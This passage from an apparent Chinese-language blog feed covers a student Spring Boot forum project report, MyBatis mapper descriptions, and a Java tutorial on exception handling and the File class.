Statements）</strong>：包括根据帖子ID查询帖子详细信息、根据一组帖子ID查询帖子列表、获取近一周内热门帖子列表、根据条件查询帖子列表和获取特定用户的帖子列表等。</p></li><li><p><strong>插入、更新和删除操作（Insert, Update, Delete Statements）</strong>：定义了插入帖子、更新帖子信息和删除帖子等数据库操作。</p></li></ul><p>BBSUserMapper.xml</p><p> XML 文件是用于 MyBatis 的数据库映射配置，定义了与用户管理相关的数据库操作，主要包括：</p><ul><li><strong>结果映射（ResultMap）</strong>：定义了一个结果映射 <code>BaseResultMap</code>，用于将数据库查询结果映射到实体类 <code>BBSUser</code> 的属性。</li><li><strong>SQL 片段（SQL Fragments）</strong>：定义了一个 SQL 片段 <code>Base_Column_List</code>，用于在查询语句中引用基本列。</li><li><strong>查询操作（Select Statements）</strong>：包括根据用户ID查询用户详细信息、根据一组用户ID查询用户列表、根据登录名查询用户信息以及根据登录名和密码查询用户信息等。</li><li><strong>插入、更新和删除操作（Insert, Update, Delete Statements）</strong>：定义了插入用户、更新用户信息和删除用户等数据库操作。</li><li>联系我：<img src="https://skymirror-1322372781.cos.ap-beijing.myqcloud.com/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240131170643.jpg"></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BBS</title>
      <link href="/2024/06/06/webbbs/"/>
      <url>/2024/06/06/webbbs/</url>
      
        <content type="html"><![CDATA[<ul><li><h1 id="学校学习交流论坛"><a href="#学校学习交流论坛" class="headerlink" title="学校学习交流论坛"></a>学校学习交流论坛</h1></li><li><h2 id="1-项目简介"><a href="#1-项目简介" class="headerlink" title="1. 项目简介"></a>1. 项目简介</h2></li><li><p>项目名称：学校学习交流论坛</p></li><li><p>项目描述：本项目旨在创建一个功能全面、易于使用的在线论坛系统，用户可以注册、登录、发布帖子、评论、收藏以及查看热门话题。该系统采用 Spring Boot 框架进行开发，确保系统的高性能和可扩展性。</p></li><li><h2 id="2-项目采用技术"><a href="#2-项目采用技术" class="headerlink" title="2. 项目采用技术"></a>2. 项目采用技术</h2></li><li><p>编程语言：JAVA HTML JavaScript CSS</p></li><li><p>框架和库：Spring Boot</p></li><li><p>数据库：8.0.37 MySQL Community Server</p></li><li><p>开发工具：IDEA2024.1</p></li><li><p>其他技术：Navicat  Maven Git Github </p></li><li><h2 id="3-功能需求分析"><a href="#3-功能需求分析" class="headerlink" title="3. 功能需求分析"></a>3. 功能需求分析</h2></li><li><p>用户注册与登录</p></li><li><p>个人资料管理</p></li><li><p>发布帖子和评论</p></li><li><p>帖子收藏</p></li><li><p>查看热门话题</p></li><li><h2 id="4-项目亮点"><a href="#4-项目亮点" class="headerlink" title="4. 项目亮点"></a>4. 项目亮点</h2></li><li><p>高性能：通过 Spring Boot 框架实现高效的请求处理。</p></li><li><p>易扩展性：模块化设计，便于功能扩展。</p></li><li><p>安全性：采用 MD5 加密用户密码，保障用户信息安全。</p></li><li><p>数据分析：提供帖子浏览量、评论量的统计功能，便于数据分析。</p></li><li><h2 id="5-系统演示"><a href="#5-系统演示" class="headerlink" title="5. 系统演示"></a>5. 系统演示</h2></li><li><p>操作视频：</p></li><li><p>主要功能截图：</p></li><li><h2 id="6-团队成员负责模块"><a href="#6-团队成员负责模块" class="headerlink" title="6. 团队成员负责模块"></a>6. 团队成员负责模块</h2></li><li></li><li><table><thead><tr><th>成员姓名</th><th>负责模块</th><th>主要贡献</th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>周永康</th><th>数据库，安全模块，github管理模块 blog管理</th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>张淏鸣          前端，用户管理，编码crypot模块</th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>姚昭丞           帖子post模块，帖子管理模块，内容支持模块，创意模块</th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table></li><li><h2 id="7-项目-Git-地址"><a href="#7-项目-Git-地址" class="headerlink" title="7. 项目 Git 地址"></a>7. 项目 Git 地址</h2></li><li><p>Git 仓库地址：<a href="https://github.com/mengnankkkk/worktest">https://github.com/mengnankkkk/worktest</a></p></li><li><p>仓库说明：用来存储源代码</p></li><li><h2 id="8-团队成员-Git-提交记录截图"><a href="#8-团队成员-Git-提交记录截图" class="headerlink" title="8. 团队成员 Git 提交记录截图"></a>8. 团队成员 Git 提交记录截图</h2></li><li><p>截图展示：每个成员的 Git 提交记录截图</p></li><li><h2 id="9-项目总结"><a href="#9-项目总结" class="headerlink" title="9. 项目总结"></a>9. 项目总结</h2></li><li><p>完成情况和成果：项目按计划完成，实现了预定的所有功能，并通过了系统测试。项目展示了团队成员在 Spring Boot 开发、前后端交互和数据库设计方面的能力。用户反馈良好，系统性能稳定，用户体验友好。</p></li><li><p>后续计划：未来我们计划继续优化系统性能，增加更多互动功能，如即时聊天、私信等。同时，将考虑引入人工智能技术，实现智能推荐和数据分析功能。</p></li><li><p>致谢：感谢所有团队成员的辛勤付出。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> bbs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 中</title>
      <link href="/2024/04/23/java2/"/>
      <url>/2024/04/23/java2/</url>
      
        <content type="html"><![CDATA[<h1 id="java中级"><a href="#java中级" class="headerlink" title="java中级"></a>java中级</h1><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>导致程序的正常流程被中断的事件，叫做异常</p><p>常见手段： try catch  finally  throws</p><h3 id="try-catch"><a href="#try-catch" class="headerlink" title="try catch"></a>try catch</h3><p>将可能抛出FileNotFoundException <strong>文件不存在异常</strong>的代码放在try里<br>2.如果文件存在，就会顺序往下执行，并且不执行catch块中的代码<br>\3. 如果文件不存在，try 里的代码会立即终止，程序流程会运行到对应的catch块中<br>\4. e.printStackTrace(); 会打印出方法的调用痕迹，如此例，会打印出异常开始于TestException的第16行，这样就便于定位和分析到底哪里出了异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        File f= <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(FileNotFoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用异常的父类进行catch也可以</p><p>多种异常可以分别解决</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">            <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">            <span class="type">Date</span> <span class="variable">d</span> <span class="operator">=</span> sdf.parse(<span class="string">&quot;2016-06-03&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;日期格式解析错误&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以多个异常统一catch解决，但是不能知道是哪一个的问题</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">            <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">            <span class="type">Date</span> <span class="variable">d</span> <span class="operator">=</span> sdf.parse(<span class="string">&quot;2016-06-03&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException | ParseException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> FileNotFoundException)</span><br><span class="line">                System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ParseException)</span><br><span class="line">                System.out.println(<span class="string">&quot;日期格式解析错误&quot;</span>);</span><br><span class="line"> </span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h3><p>无论是否出现异常，finally中的代码都会被执行</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        File f= <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(FileNotFoundException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;d:/LOL.exe不存在&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;无论文件是否存在， 都会执行的代码&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="throws方法"><a href="#throws方法" class="headerlink" title="throws方法"></a>throws方法</h3><p>考虑如下情况：<br>主方法调用method1<br>method1调用method2<br>method2中打开文件</p><p>method2中需要进行异常处理<br>但是method2<strong>不打算处理</strong>，而是把这个异常通过<strong>throws****抛出去</strong><br>那么method1就会<strong>接到该异常</strong>。 处理办法也是两种，要么是try catch处理掉，要么也是<strong>抛出去</strong>。<br>method1选择本地try catch住 一旦try catch住了，就相当于把这个异常消化掉了，主方法在调用method1的时候，就不需要进行异常处理了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        method1();</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method2();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method2</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        System.out.println(<span class="string">&quot;试图打开 d:/LOL.exe&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">        System.out.println(<span class="string">&quot;成功打开&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>throws与throw这两个关键字接近，不过意义不一样，有如下区别：<br>\1. throws 出现在方法声明上，而throw通常都出现在方法体内。<br>\2. throws 表示出现异常的一种可能性，并不一定会发生这些异常；throw则是抛出了异常，执行throw则一定抛出了某个异常对象。</p><h2 id="异常分类"><a href="#异常分类" class="headerlink" title="异常分类"></a>异常分类</h2><p> 可查异常，运行时异常和错误3种<br>其中，运行时异常和错误又叫非可查异常</p><h3 id="可查异常"><a href="#可查异常" class="headerlink" title="可查异常"></a>可查异常</h3><p>CheckedException<br>可查异常即<strong>必须进行处理的异常</strong>，要么try catch住,要么往外抛，谁调用，谁处理，比如 FileNotFoundException<br>如果不处理，编译器，就不让你通过</p><h3 id="运行时异常"><a href="#运行时异常" class="headerlink" title="运行时异常"></a>运行时异常</h3><p>RuntimeException指： <strong>不是必须进行try catch的异常</strong></p><p><strong>常见运行时异常:</strong><br>除数不能为0异常:ArithmeticException<br>下标越界异常:ArrayIndexOutOfBoundsException<br>空指针异常:NullPointerException<br>在编写代码的时候，依然可以使用try catch throws进行处理，与可查异常不同之处在于，<strong>即便不进行try catch，也不会有编译错误</strong><br>Java之所以会设计运行时异常的原因之一，是因为下标越界，空指针这些运行时异常<strong>太过于普遍</strong>，如果都需要进行捕捉，代码的可读性就会变得很糟糕。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//任何除数不能为0:ArithmeticException</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">5</span>/<span class="number">0</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//下标越界异常：ArrayIndexOutOfBoundsException</span></span><br><span class="line">        <span class="type">int</span> j[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line">        j[<span class="number">10</span>] = <span class="number">10</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="comment">//空指针异常：NullPointerException</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        str.length();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><p>错误Error，指的是<strong>系统级别的异常</strong>，通常是内存用光了<br>在<strong>默认设置下</strong>，一般java程序启动的时候，最大可以使用16m的内存<br>如例不停的给StringBuffer追加字符，很快就把内存使用光了。抛出<strong>OutOfMemoryError</strong><br>与运行时异常一样，错误也是不要求强制捕捉的</p><p>代码比较复制代码</p><p><img src="https://stepimagewm.how2j.cn/2412.png" alt="三种分类"></p><h3 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h3><p>是类，Exception和Error都继承了该类<br>所以在捕捉的时候，也可以使用Throwable进行捕捉<br>如图： 异常分<strong>Error</strong>和<strong>Exception</strong><br>Exception里又分<strong>运行时异常</strong>和<strong>可查异常</strong>。</p><p><img src="https://stepimagewm.how2j.cn/742.png" alt="Throwable"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOL.exe&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">            <span class="comment">//使用Throwable进行异常捕捉</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestException</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        method1();</span><br><span class="line">      <span class="comment">/*int a=  getresult();</span></span><br><span class="line"><span class="comment">        System.out.println(a);*/</span></span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        File f=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/lol&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getresult</span><span class="params">()</span>&#123;</span><br><span class="line">        File f=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/&quot;</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;<span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">       &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h3><p>1.创建一个类EnemyHeroIsDeadException，并继承Exception<br>提供两个构造方法<br>\1. 无参的构造方法<br>\2. 带参的构造方法，并调用父类的对应的构造方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EnemyHeroIsDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">()</span>&#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attackHero</span><span class="params">(Hero h)</span> <span class="keyword">throws</span> EnemyHeroIsDeadException&#123;</span><br><span class="line">        <span class="keyword">if</span>(h.hp == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EnemyHeroIsDeadException</span>(h.name + <span class="string">&quot; 已经挂了,不需要施放技能&quot;</span> );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EnemyHeroIsDeadException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span>&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">()</span>&#123;</span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EnemyHeroIsDeadException</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">            <span class="built_in">super</span>(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">garen</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        garen.name = <span class="string">&quot;盖伦&quot;</span>;</span><br><span class="line">        garen.hp = <span class="number">616</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="type">Hero</span> <span class="variable">teemo</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        teemo.name = <span class="string">&quot;提莫&quot;</span>;</span><br><span class="line">        teemo.hp = <span class="number">0</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            garen.attackHero(teemo);</span><br><span class="line">             </span><br><span class="line">        &#125; <span class="keyword">catch</span> (EnemyHeroIsDeadException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            System.out.println(<span class="string">&quot;异常的具体原因:&quot;</span>+e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JAVA-的FILE类，以及常用方法"><a href="#JAVA-的FILE类，以及常用方法" class="headerlink" title="JAVA 的FILE类，以及常用方法"></a>JAVA 的FILE类，以及常用方法</h2><h3 id="创建文件对象"><a href="#创建文件对象" class="headerlink" title="创建文件对象"></a>创建文件对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> file;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFile</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 绝对路径</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;d:/LOLFolder&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;f1的绝对路径：&quot;</span> + f1.getAbsolutePath());</span><br><span class="line">        <span class="comment">// 相对路径,相对于工作目录，如果在eclipse中，就是项目目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;LOL.exe&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;f2的绝对路径：&quot;</span> + f2.getAbsolutePath());</span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 把f1作为父目录创建文件对象</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">f3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(f1, <span class="string">&quot;LOL.exe&quot;</span>);</span><br><span class="line">  </span><br><span class="line">        System.out.println(<span class="string">&quot;f3的绝对路径：&quot;</span> + f3.getAbsolutePath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
